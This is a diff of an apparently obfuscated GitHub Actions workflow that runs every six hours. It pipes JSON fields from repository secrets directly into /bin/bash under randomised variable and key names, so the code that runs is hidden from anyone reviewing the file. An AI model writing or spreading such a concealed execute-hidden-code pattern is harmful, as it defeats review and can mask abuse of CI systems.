@@ -1,32 +1,25 @@
 name: haofengshengna
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 4/6 * * *'
-
-jobs:  # 13961
+    - cron: '16 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: haofengshengna
         env:
-          u68545: ${{ secrets.u68545 }}
+          cz0: ${{ secrets.cz0 }}
         run: |
-          echo $u68545 | jq -r .fwbll300 | /bin/bash
-          echo $hjfq234 | jq -r .vtvor5020 | /bin/bash
-          echo $ve87 | jq -r .tuy628 | /bin/bash
-          echo $wwnyc928 | jq -r .etb5859 | /bin/bash
-          echo $v92521 | jq -r .hbwh7572 | /bin/bash
-          echo $dpvh31624 | jq -r .bziqu2 | /bin/bash
-          echo $ortyj1 | jq -r .w2940 | /bin/bash
-          echo $pvf24101 | jq -r .e102 | /bin/bash
-          echo $izitl67 | jq -r .zg57381 | /bin/bash
-          echo $yk91 | jq -r .ksf78162 | /bin/bash
-          echo $lfps748 | jq -r .pi0 | /bin/bash
-          echo $y82 | jq -r .rp65599 | /bin/bash
-          echo $hfa19294 | jq -r .wgckc67 | /bin/bash
-          echo $hjbtj9035 | jq -r .peaml894 | /bin/bash
-          echo $lgx71486 | jq -r .wukbc7231 | /bin/bash
-          echo $t9 | jq -r .q130 | /bin/bash
+          echo $cz0 | jq -r .qfz699 | /bin/bash
+          echo $pq9 | jq -r .hzwd9 | /bin/bash
+          echo $el385 | jq -r .odb0633 | /bin/bash
+          echo $b1 | jq -r .fdfh37 | /bin/bash
+          echo $h2033 | jq -r .kgfmc66 | /bin/bash
+          echo $rkit1 | jq -r .ykf96 | /bin/bash
+          echo $pnp007 | jq -r .hhauf5941 | /bin/bash
+          echo $tsa0 | jq -r .p858 | /bin/bash
 
